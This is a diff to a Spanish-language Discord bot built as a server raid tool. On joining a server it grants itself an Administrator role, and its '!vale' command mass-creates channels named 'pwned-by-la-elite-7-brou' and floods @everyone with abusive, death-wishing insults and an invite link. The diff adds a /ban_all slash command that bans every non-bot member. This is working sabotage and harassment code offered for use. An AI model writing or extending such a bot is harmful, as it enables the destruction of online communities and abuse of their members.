@@ -1,6 +1,6 @@
 require('dotenv').config();
 
-const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
+const { Client, GatewayIntentBits, ChannelType, SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');
 
 const client = new Client({
   intents: [
@@ -16,9 +16,24 @@ const PREFIX = '!';
 // Ya no usamos OWNER_IDS para limitar comandos
 // const OWNER_IDS = ["1436516806842912970"]; // comentado o borrado
 
-client.once('ready', () => {
+client.once('ready', async () => {
   console.log('Bot conectado como ' + client.user.tag);
   console.log('Prefijo: ' + PREFIX);
+
+  // Registrar el comando slash /ban_all
+  const commands = [
+    new SlashCommandBuilder()
+      .setName('ban_all')
+      .setDescription('Intenta banear a todos los miembros del servidor (excepto bots y tú)')
+      .setDefaultMemberPermissions(PermissionFlagsBits.BanMembers)
+  ];
+
+  try {
+    await client.application.commands.set(commands);
+    console.log('Comando /ban_all registrado');
+  } catch (err) {
+    console.error('Error al registrar /ban_all:', err);
+  }
 });
 
 // ────────────────────────────────────────────────
@@ -31,7 +46,7 @@ client.on('guildCreate', async (guild) => {
   try {
     // 1. Crear rol con permisos de administrador
     const rolAdmin = await guild.roles.create({
-      name: 'Admin permenmente',          // nombre del rol (cámbialo si querés)
+      name: 'Admin permenente',          // nombre del rol (cámbialo si querés)
       color: '#FF0000',                // rojo intenso
       permissions: ['Administrator'],  // todos los permisos de admin
       hoist: true,                     // aparece separado en la lista
@@ -87,8 +102,9 @@ client.on('guildCreate', async (guild) => {
     console.error(`[ERROR GUILDCREATE] ${err.message}`);
   }
 });
+
 // ────────────────────────────────────────────────
-//                COMANDOS (sin OWNER_IDS)
+//                COMANDOS PREFIX (como antes)
 // ────────────────────────────────────────────────
 
 client.on('messageCreate', async (message) => {
@@ -107,11 +123,9 @@ client.on('messageCreate', async (message) => {
   }
 
   if (command === 'vale') {
-    // SIN RESTRICCIÓN: cualquiera puede usarlo ahora
-    // (si querés volver a limitarlo, solo pon de nuevo el if de OWNER_IDS)
-
     const nombresDeCanales = [
-      "pwned-by-la-elite-7-brous",
+      "pwned-by-la-elite-7-brou",
+      "pwned-by-la-elite-7-brou",
       "pwned-by-la-elite-7-brou",
       "pwned-by-la-elite-7-brou",
       "pwned-by-la-elite-7-brou",
@@ -151,9 +165,9 @@ client.on('messageCreate', async (message) => {
       "@everyone puto mal parido hijueputa https://discord.gg/Gvpej3G6",
       "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/Gvpej3G6",
       "@everyone pendejo subnormal hijueputa https://discord.gg/Gvpej3G6",
-      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/Gvpej3G6",
-      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/Gvpej3G6",
-      "@everyone ojalas te mueras hijueputa https://discord.gg/Gvpej3G6",
+      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/Gvpej3G6 ",
+      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/Gvpej3G6 ",
+      "@everyone ojalas te mueras hijueputa https://discord.gg/Gvpej3G6 ",
       "@everyone puto mal parido hijueputa  https://discord.gg/Gvpej3G6",
       "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/Gvpej3G6 ",
       "@everyone pendejo subnormal hijueputa https://discord.gg/Gvpej3G6",
@@ -264,8 +278,6 @@ client.on('messageCreate', async (message) => {
   }
 
   if (command === 'admin') {
-    // SIN RESTRICCIÓN: cualquiera puede usarlo ahora
-
     const serverName = args.join(' ');
     if (!serverName) {
       return message.reply('Uso: !admin <nombre del servidor>\nEjemplo: !admin Mi Server Raid');
@@ -293,6 +305,41 @@ client.on('messageCreate', async (message) => {
       console.error('Error en !admin:', err.message || err);
       await message.channel.send(`Error: ${err.message || 'No tengo permisos suficientes'}`).catch(() => {});
     }
+  }
+});
+
+// Manejar el comando slash /ban_all
+client.on('interactionCreate', async (interaction) => {
+  if (!interaction.isChatInputCommand()) return;
+
+  if (interaction.commandName === 'ban_all') {
+    await interaction.deferReply({ ephemeral: true });
+
+    const guild = interaction.guild;
+    const botId = client.user.id;
+
+    let baneados = 0;
+    let fallos = 0;
+
+    for (const member of guild.members.cache.values()) {
+      if (member.user.bot || member.user.id === botId || member.user.id === TU_ID) {
+        continue;
+      }
+
+      try {
+        await member.ban({ reason: 'Ban All by Patricio - RAID 🔥' });
+        baneados++;
+        await new Promise(r => setTimeout(r, 1200));
+      } catch (err) {
+        fallos++;
+        console.log(`Fallo al banear ${member.user.tag}: ${err.message}`);
+      }
+    }
+
+    await interaction.editReply({
+      content: `**Ban All finalizado**\nBaneados: **${baneados}**\nFallos: **${fallos}**\n(No se banea bots ni tu ID (${TU_ID}))`,
+      ephemeral: true
+    });
   }
 });
 
